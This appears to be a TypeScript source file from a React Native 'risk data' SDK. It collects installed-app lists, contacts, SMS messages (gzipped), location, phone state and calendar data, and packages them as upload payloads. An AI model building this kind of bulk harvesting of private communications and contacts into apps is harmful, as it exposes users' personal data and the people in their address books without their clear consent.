import { Platform } from "react-native";
import pako from 'pako';
import { Buffer } from 'buffer';
import { to } from "../to";

const NO_DATA = "NO_DATA";

function gzip(strData: string): string {
    if (strData.length <= 100) return strData;
    const input = Buffer.from(strData, "utf-8");
    const inputUint8Array = pako.gzip(input);
    return Buffer.from(inputUint8Array).toString("base64");
}

export enum RiskData {
    Application = "1",
    Contact = "2",
    SMS = "4",
    Location = "5",
    PhoneState = "6",
    Calendar = "12",
    Schema = "13",
    CallLog = "7"
}

export interface I_SDK {
    getApkListInfo?: () => Promise<string>;
    getContactInfo?: () => Promise<string>;
    getSMSInfo?: () => Promise<string>;
    getPhoneState?: () => Promise<string>;
    getCallLog?: () => Promise<string>;
    getLocationInfo?: () => Promise<string>;
    getCalendarInfo?: () => Promise<string>;
    getSchemaInfo?: () => Promise<string>;
}
type StrategyConfig = {
    method: keyof I_SDK;
    compress?: boolean;
    platform?: typeof Platform.OS;
};
export interface I_RiskInfo {
    jsonPayload?: string;
    uploadType?: RiskData;
    isUploaded?: typeof NO_DATA;
}

const RISK_STRATEGIES: Partial<Record<RiskData, StrategyConfig>> = {
    [RiskData.Application]: { method: 'getApkListInfo' },
    [RiskData.Contact]: { method: 'getContactInfo', platform: "ios" },
    [RiskData.SMS]: { method: 'getSMSInfo', compress: true, platform: "android" },
    [RiskData.Location]: { method: 'getLocationInfo' },
    [RiskData.PhoneState]: { method: 'getPhoneState' },
    [RiskData.Calendar]: { method: 'getCalendarInfo' },
    [RiskData.Schema]: { method: 'getSchemaInfo', platform: 'ios' },
};
function isValueInEnum<T extends Record<string, string | number>>(
    value: any,
    targetEnum: T
): value is T[keyof T] {
    return Object.values(targetEnum).includes(value);
}
export const createRiskBuilder = <T extends I_SDK>(
    sdk: T,
) => {

    const finalStrategies = { ...RISK_STRATEGIES };

    return async (codes: Array<string | number>): Promise<I_RiskInfo[]> => {

        const activeCodes = new Set<RiskData>(codes.filter((code) => {
            return isValueInEnum(code, RiskData)
        }));

        const tasks = Array.from(activeCodes).map(async (code) => {
            const strategy = finalStrategies[code];
            if (!strategy) {
                console.error(`[Risk Build] [${code} is not supported]`);
                return null
            };
            if (strategy.platform && Platform.OS !== strategy.platform) {
                console.error(`[Risk Build]  [${code} is not supported in ${Platform.OS}]`);
                return null
            };

            const fetcher = sdk[strategy.method];
            if (typeof fetcher !== 'function') return null;

            const [err, rawData] = await to(fetcher.call(sdk));

            if (err) {
                console.error(`[Risk Build] ${code} failed:`, err);
                return null;
            }

            let payload = rawData || "";
            const temp: I_RiskInfo = { uploadType: code };

            if (strategy.compress && payload) {
                console.info(`[Risk Build] ${code} compress`);
                payload = gzip(payload);
            }

            temp.jsonPayload = payload;

            if (payload === "[]" || payload === "{}" || !payload) {
                temp.isUploaded = NO_DATA;
            }
            return (temp.jsonPayload || temp.isUploaded) ? temp : null;
        });

        const results = await Promise.all(tasks);
        return results.filter((item): item is I_RiskInfo => Boolean(item));
    };
};

